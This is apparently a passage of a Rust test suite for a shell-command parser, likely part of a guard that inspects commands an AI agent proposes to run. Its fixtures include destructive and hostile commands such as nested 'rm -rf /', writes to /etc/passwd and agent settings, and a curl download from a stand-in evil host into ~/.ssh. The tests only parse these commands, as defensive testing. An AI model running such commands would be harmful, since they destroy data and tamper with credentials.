        assert_eq!(inner[0], argv("git", &["reset", "--hard", "HEAD~1"]));
    }

    #[test]
    fn parses_xargs_inner_command() {
        let b = parse("printf '/\\0' | xargs -0 rm -rf");
        let inner = &b.segments[0].commands[1].inner_argv;
        assert_eq!(inner.len(), 1);
        assert_eq!(inner[0], argv("rm", &["-rf"]));
    }

    #[test]
    fn parses_xargs_inner_command_with_dash_x_flag() {
        let b = parse("printf '/\\0' | xargs -0 -x rm -rf /");
        let inner = &b.segments[0].commands[1].inner_argv;
        assert_eq!(inner.len(), 1);
        assert_eq!(inner[0], argv("rm", &["-rf", "/"]));
    }

    #[test]
    fn parses_find_exec_inner_command() {
        let b = parse(r"find . -name tmp -exec rm -rf {} \;");
        let inner = &b.segments[0].commands[0].inner_argv;
        assert_eq!(inner.len(), 1);
        assert_eq!(inner[0], argv("rm", &["-rf"]));
    }

    #[test]
    fn preserves_redirects_from_inner_shell_code() {
        let b = parse("bash -c 'echo hi > .claude/settings.json'");
        assert_eq!(b.segments[0].commands[0].inner_redirects.len(), 1);
        assert_eq!(
            b.segments[0].commands[0].inner_redirects[0],
            Redirect {
                op: RedirectOp::Stdout,
                target: ".claude/settings.json".into(),
            }
        );
    }

    #[test]
    fn commands_flattens_nested_wrappers() {
        let b = parse("bash -c 'xargs rm -rf'");
        let heads: Vec<_> = b
            .commands()
            .into_iter()
            .map(|argv| argv.head.as_str())
            .collect();
        assert_eq!(heads, vec!["bash", "xargs", "rm"]);
    }

    // Length of the longest `inner_argv` chain reachable from `argv`.
    // Root is not counted; equals the number of unrolled wrapper hops.
    fn deepest_inner_chain(argv: &Argv) -> usize {
        argv.inner_argv
            .iter()
            .map(|a| 1 + deepest_inner_chain(a))
            .max()
            .unwrap_or(0)
    }

    #[test]
    fn inner_argv_chain_length_for_single_wrapper_is_one() {
        let b = parse("bash -c 'rm -rf /'");
        let chain = deepest_inner_chain(&b.segments[0].commands[0]);
        assert_eq!(chain, 1);
    }

    #[test]
    fn inner_argv_chain_at_budget_unrolls_both_layers() {
        let b = parse(r#"bash -c 'bash -c "rm -rf /"'"#);
        let chain = deepest_inner_chain(&b.segments[0].commands[0]);
        assert_eq!(chain, 2);
        let heads: Vec<_> = b
            .commands()
            .into_iter()
            .map(|argv| argv.head.clone())
            .collect();
        assert!(heads.contains(&"rm".to_string()), "got heads: {heads:?}");
    }

    #[test]
    fn inner_argv_chain_one_above_budget_is_capped_at_two() {
        let b = parse(r#"bash -c 'bash -c "bash -c \"rm -rf /\""'"#);
        let chain = deepest_inner_chain(&b.segments[0].commands[0]);
        assert!(chain <= 2, "chain {chain} exceeded nesting_budget=2");
    }

    #[test]
    fn lone_ampersand_does_not_loop() {
        // Found by PBT: a bare `&` (not part of `&&`) used to cause an
        // infinite loop in tokenize. Verify the lexer terminates and
        // produces no segments for inputs that contain only `&`s.
        let b = parse("&");
        assert!(b.segments.is_empty());
        let b = parse("ls & echo done");
        // The `&` is dropped; `ls` and `echo done` collapse into one
        // segment because there is no separator between them.
        assert!(!b.segments.is_empty());
    }

    #[test]
    fn empty_pipeline_segment_is_dropped() {
        // `|;` would yield an empty pipeline; ensure parse drops it.
        let b = parse("ls | ; echo done");
        // first segment "ls |" produces a pipeline with [ls]
        assert!(!b.segments.is_empty());
        assert_eq!(b.segments[0].commands[0].head, "ls");
    }

    #[test]
    fn parses_redirect_to_file() {
        let b = parse("echo hi > /etc/passwd");
        assert_eq!(b.segments.len(), 1);
        let p = &b.segments[0];
        assert_eq!(p.commands[0], argv("echo", &["hi"]));
        assert_eq!(p.redirects.len(), 1);
        assert_eq!(
            p.redirects[0],
            Redirect {
                op: RedirectOp::Stdout,
                target: "/etc/passwd".into(),
            }
        );
        assert!(b.has_redirect);
        assert!(!b.has_heredoc);
        assert!(!b.has_process_substitution);
    }

    #[test]
    fn parses_redirect_append() {
        let b = parse("echo hi >> /var/log/x");
        assert_eq!(b.segments[0].redirects.len(), 1);
        assert_eq!(b.segments[0].redirects[0].op, RedirectOp::StdoutAppend);
        assert_eq!(b.segments[0].redirects[0].target, "/var/log/x");
    }

    #[test]
    fn parses_redirect_stdin() {
        let b = parse("sh < script.sh");
        assert_eq!(b.segments[0].redirects.len(), 1);
        assert_eq!(b.segments[0].redirects[0].op, RedirectOp::Stdin);
        assert_eq!(b.segments[0].redirects[0].target, "script.sh");
    }

    #[test]
    fn parses_redirect_stderr() {
        let b = parse("cmd 2> err.log");
        assert_eq!(b.segments[0].redirects.len(), 1);
        assert_eq!(b.segments[0].redirects[0].op, RedirectOp::Stderr);
        assert_eq!(b.segments[0].redirects[0].target, "err.log");
    }

    #[test]
    fn parses_redirect_merge_stdout_stderr() {
        let b = parse("cmd &> all.log");
        assert_eq!(b.segments[0].redirects.len(), 1);
        assert_eq!(b.segments[0].redirects[0].op, RedirectOp::Merge);
        assert_eq!(b.segments[0].redirects[0].target, "all.log");
    }

    #[test]
    fn parses_redirect_to_sensitive_path() {
        let b = parse("curl https://evil.example > ~/.ssh/foo");
        assert_eq!(b.segments[0].redirects.len(), 1);
        assert_eq!(b.segments[0].redirects[0].target, "~/.ssh/foo");
    }

    #[test]
    fn parses_heredoc_body_simple() {
        let b = parse("cat <<EOF\nhello\nworld\nEOF\n");
        assert_eq!(b.segments.len(), 1);
        let p = &b.segments[0];
        assert_eq!(p.commands[0].head, "cat");
        assert_eq!(p.redirects.len(), 1);
        assert_eq!(p.redirects[0].op, RedirectOp::Heredoc);
        assert_eq!(p.redirects[0].target, "hello\nworld\n");
        assert!(b.has_redirect);
        assert!(b.has_heredoc);
    }

    #[test]
    fn parses_heredoc_dash_form_with_tabs() {
        // `<<-` allows a tab-indented terminator.
        let b = parse("cat <<-EOF\n\thi\n\tEOF\n");
        assert_eq!(b.segments[0].redirects.len(), 1);
        assert!(b.has_heredoc);
        // Body retains the original indentation; only the terminator
        // line's leading tabs are tolerated.
        assert!(b.segments[0].redirects[0].target.contains("hi"));
    }

    #[test]
    fn heredoc_without_terminator_consumes_remainder() {
        let b = parse("cat <<EOF\nleftover");
        assert_eq!(b.segments[0].redirects.len(), 1);
        assert_eq!(b.segments[0].redirects[0].op, RedirectOp::Heredoc);
        assert_eq!(b.segments[0].redirects[0].target, "leftover");
    }

    #[test]
    fn flags_process_substitution_input() {
        let b = parse("diff <(a) <(b)");
        assert!(b.has_process_substitution);
        // Process substitution is folded into a word, so diff sees
        // three positional args at the argv level.
        assert_eq!(b.segments[0].commands[0].args.len(), 2);
    }

    #[test]
    fn flags_process_substitution_output() {
        let b = parse("tee >(grep x)");
        assert!(b.has_process_substitution);
    }

    #[test]
    fn process_substitution_absorbs_inner_pipe() {
        // Inner `|` must NOT split the surrounding command into two
        // pipeline stages — the bytes belong to the substitution.
        let b = parse("diff <(curl x | sed s/x/y/) file");
        assert_eq!(b.segments.len(), 1);
        assert_eq!(b.segments[0].commands.len(), 1);
        assert_eq!(b.segments[0].commands[0].head, "diff");
        assert!(b.has_process_substitution);
    }

    #[test]
    fn redirects_attach_to_pipeline_not_segment() {
        // A pipeline with both a redirect and a downstream command:
        // `curl x > /tmp/y | grep z`.
        let b = parse("curl x > /tmp/y | grep z");
        assert_eq!(b.segments.len(), 1);
        let p = &b.segments[0];
        assert_eq!(p.commands.len(), 2);
        assert_eq!(p.redirects.len(), 1);
        assert_eq!(p.redirects[0].target, "/tmp/y");
    }

    #[test]
    fn separator_after_redirect_target_starts_new_segment() {
        let b = parse("echo hi > out; ls");
        assert_eq!(b.segments.len(), 2);
        assert_eq!(b.segments[0].redirects.len(), 1);
        assert_eq!(b.segments[0].redirects[0].target, "out");
        assert_eq!(b.segments[1].commands[0].head, "ls");
    }

    #[test]
    fn redirect_only_pipeline_is_kept() {
        // `> /tmp/out` with no command before it: still yields a
        // pipeline (no commands) so callers see that a redirect
        // happened in the segment.
        let b = parse("> /tmp/out");
        assert_eq!(b.segments.len(), 1);
        assert!(b.segments[0].commands.is_empty());
        assert_eq!(b.segments[0].redirects.len(), 1);
    }

    #[test]
    fn read_word_advances_for_every_non_separator_byte() {
        // Forward-progress contract for `read_word`: when called after
        // the caller has filtered whitespace and the separator bytes,
        // it must always consume at least one byte. Walk every printable
        // ASCII byte that is neither whitespace nor `|`/`&`/`;` and
        // ensure the lexer terminates with at least one token.
        for byte in 0x21u8..=0x7eu8 {
            if matches!(byte, b'|' | b'&' | b';') {
                continue;
            }
            let buf = [byte];
            let (_, advanced, _) = read_word(&buf);
            assert!(advanced > 0, "read_word stalled on byte {byte:#x}");
        }
    }

    use crate::testing::proptest::{
        arbitrary_command, arbitrary_utf8_bytes, bash_command, bash_heredoc, bash_process_subst,
        bash_redirects, bash_wrapper_nested, combined_short_opts,
    };
    use proptest::collection::vec as pvec;
    use proptest::prelude::*;

    proptest! {
        // Adversarial: the parser must not panic, hang, or blow up memory
        // for any printable ASCII. (PBT discovered a real infinite-loop
        // bug here when fed a lone `&` — see `lone_ampersand_does_not_loop`.)
        #[test]
        fn pbt_parse_never_panics(s in arbitrary_command()) {
            let _ = parse(&s);
        }

        // Structured generator: the parser still succeeds and produces
        // at least one segment whenever the source has non-whitespace
        // content.
        #[test]
        fn pbt_structured_command_yields_segments(s in bash_command()) {
            let b = parse(&s);
            if s.chars().any(|c| !c.is_whitespace()) {
                prop_assert!(!b.segments.is_empty());
            }
        }

        // Whitespace-only input parses to an empty segment list.
        #[test]
        fn pbt_blank_input_has_no_segments(spaces in "[ \\t]{0,20}") {
            let b = parse(&spaces);
            prop_assert!(b.segments.is_empty());
        }

        // Single-quoted text protects shell separators: any printable
        // ASCII (without single quotes) wrapped in `'…'` becomes one
        // segment with one command.
        #[test]
        fn pbt_single_quotes_protect_separators(inner in "[ -&(-~]{0,30}") {
            // Exclude ' (0x27) from the inner so we don't terminate the quote.
            let cmd = format!("echo '{inner}'");
            let b = parse(&cmd);
            prop_assert_eq!(b.segments.len(), 1);
            prop_assert_eq!(b.segments[0].commands.len(), 1);
            prop_assert_eq!(&b.segments[0].commands[0].head, "echo");
        }

        // is_flag invariant lifted to user-facing semantics.
        #[test]
        fn pbt_flags_partition_args(args in pvec("[A-Za-z0-9_./-]{1,8}", 0..6)) {
            let cmd = format!("ls {}", args.join(" "));
            let b = parse(&cmd);
            if let Some(first) = b.segments.first().and_then(|p| p.commands.first()) {
                let flags: Vec<&str> = first.flags().collect();
                let positional: Vec<&str> = first.positional().collect();
                // Disjoint:
                for f in &flags {
                    prop_assert!(!positional.contains(f));
                }
                // Union spans every recorded arg:
                prop_assert_eq!(flags.len() + positional.len(), first.args.len());
            }
        }

        // Joining N safe heads with `|` produces one segment with N commands.
        #[test]
        fn pbt_pipe_produces_n_commands(heads in pvec("[a-z][a-z0-9]{0,5}", 1..4)) {
            let cmd = heads.join(" | ");
            let b = parse(&cmd);
            prop_assert_eq!(b.segments.len(), 1);
            prop_assert_eq!(b.segments[0].commands.len(), heads.len());
            for (i, h) in heads.iter().enumerate() {
                prop_assert_eq!(&b.segments[0].commands[i].head, h);
            }
        }

        // Joining N safe heads with `;` produces N segments.
        #[test]
        fn pbt_semicolon_produces_n_segments(heads in pvec("[a-z][a-z0-9]{0,5}", 1..4)) {
            let cmd = heads.join("; ");
            let b = parse(&cmd);
            prop_assert_eq!(b.segments.len(), heads.len());
            for (i, h) in heads.iter().enumerate() {
                prop_assert_eq!(&b.segments[i].commands[0].head, h);
            }
        }

        // Env assignments come before the head and are stripped from args.
        #[test]
        fn pbt_env_assignments_precede_head(
            keys in pvec("[A-Z_][A-Z0-9_]{0,6}", 0..3),
            vals in pvec("[a-zA-Z0-9]{1,6}", 0..3),
        ) {
            // Build matching K=V pairs, then a head + flag.
            let n = keys.len().min(vals.len());
            let mut prefix = String::new();
            for i in 0..n {
                prefix.push_str(&format!("{}={} ", keys[i], vals[i]));
            }
            let cmd = format!("{prefix}cmd --flag");
            let b = parse(&cmd);
            prop_assert_eq!(b.segments.len(), 1);
            let argv = &b.segments[0].commands[0];
            prop_assert_eq!(&argv.head, "cmd");
            prop_assert_eq!(argv.env_assignments.len(), n);
            for i in 0..n {
                prop_assert_eq!(&argv.env_assignments[i].key, &keys[i]);
                prop_assert_eq!(&argv.env_assignments[i].value, &vals[i]);
            }
        }

        // testing.md L46: redirect operators are surfaced into
        // `Pipeline.redirects` and `Bash::has_redirect`. The generated
        // op count must equal the parsed redirect count, and each
        // emitted op must map to the matching `RedirectOp` variant.
        #[test]
        fn pbt_redirect_operators_surface_to_pipeline(
            (cmd, ops) in bash_redirects()
        ) {
            let b = parse(&cmd);
            prop_assert!(b.has_redirect);
            prop_assert_eq!(b.segments.len(), 1);
            let redirects = &b.segments[0].redirects;
            prop_assert_eq!(redirects.len(), ops.len());
            for (i, raw) in ops.iter().enumerate() {
                let expected = match *raw {
                    ">" => RedirectOp::Stdout,
                    ">>" => RedirectOp::StdoutAppend,
                    "<" => RedirectOp::Stdin,
                    "2>" => RedirectOp::Stderr,
                    "&>" => RedirectOp::Merge,
                    other => panic!("unexpected raw op {other:?}"),
                };
                prop_assert_eq!(redirects[i].op, expected);
            }
        }

        // testing.md L48-49: heredoc body lives inside a single
        // `Redirect` with op `Heredoc`. No body line may equal the
        // terminator (after stripping leading tabs for `<<-TAG`) — that
        // would mean the parser failed to close the heredoc. Substring
        // matches like `EOFa` are legitimate body content and must not
        // trigger this assertion.
        #[test]
        fn pbt_heredoc_body_is_one_redirect((cmd, tag) in bash_heredoc()) {
            let b = parse(&cmd);
            prop_assert!(b.has_heredoc);
            prop_assert!(b.has_redirect);
            let heredocs: Vec<&Redirect> = b
                .segments
                .iter()
                .flat_map(|p| p.redirects.iter())
                .filter(|r| matches!(r.op, RedirectOp::Heredoc))
                .collect();
            prop_assert!(!heredocs.is_empty());
            for r in heredocs {
                prop_assert!(
                    !r.target
                        .lines()
                        .any(|l| l.trim_start_matches('\t') == tag),
                    "heredoc body contains a line matching terminator {tag:?}: {:?}",
                    r.target
                );
            }
        }

        // testing.md L50-51: `<(...)` / `>(...)` are paren-balanced and
        // surface as `Bash::has_process_substitution`.
        #[test]
        fn pbt_process_substitution_is_flagged(cmd in bash_process_subst()) {
            let b = parse(&cmd);
            prop_assert!(b.has_process_substitution);
        }

        // testing.md L52: `bash -lc`, `sh -ec`, etc. — combined short
        // options still expose the wrapped command body. The wrapper
        // inspector folds the body into either `inner_argv` (when the
        // body parses) or `inner_code` (always preserved verbatim).
        #[test]
        fn pbt_combined_short_opts_surface_inner_payload(
            cmd in combined_short_opts()
        ) {
            let b = parse(&cmd);
            let outer_opt = b
                .segments
                .first()
                .and_then(|p| p.commands.first());
            prop_assert!(outer_opt.is_some(), "wrapper command did not parse: {cmd}");
            let outer = outer_opt.expect("Some after prop_assert");
            prop_assert!(
                !outer.inner_code.is_empty() || !outer.inner_argv.is_empty(),
                "combined short option failed to surface payload: {:?}",
                outer
            );
        }

        // testing.md L53-54: wrapper unrolling is bounded — even when
        // the source nests `bash -c` deeper than the budget, the parser
        // must terminate and the surfaced `inner_argv` chain must not
        // exceed the static `nesting_budget` (currently 2, see
        // `parse(...)` in this file).
        #[test]
        fn pbt_inner_argv_chain_is_bounded(cmd in bash_wrapper_nested(4)) {
            let b = parse(&cmd);
            for pipe in &b.segments {
                for argv in &pipe.commands {
                    let chain = deepest_inner_chain(argv);
                    prop_assert!(
                        chain <= 2,
                        "inner_argv chain {chain} exceeded nesting_budget=2",
                    );
                }
            }
        }

        // testing.md L55-56: tokenizer makes forward progress on every
        // step (`debug_assert!(advanced > 0)`). Surface the same
        // invariant at the public API: even on adversarial byte input
        // (lossy-decoded into a String), `parse` must terminate without
        // panicking. proptest's per-case deadline catches stalls.
        #[test]
        fn pbt_parse_terminates_on_arbitrary_bytes(bytes in arbitrary_utf8_bytes()) {
            let s = String::from_utf8_lossy(&bytes).into_owned();
            let _ = parse(&s);
        }
    }
}
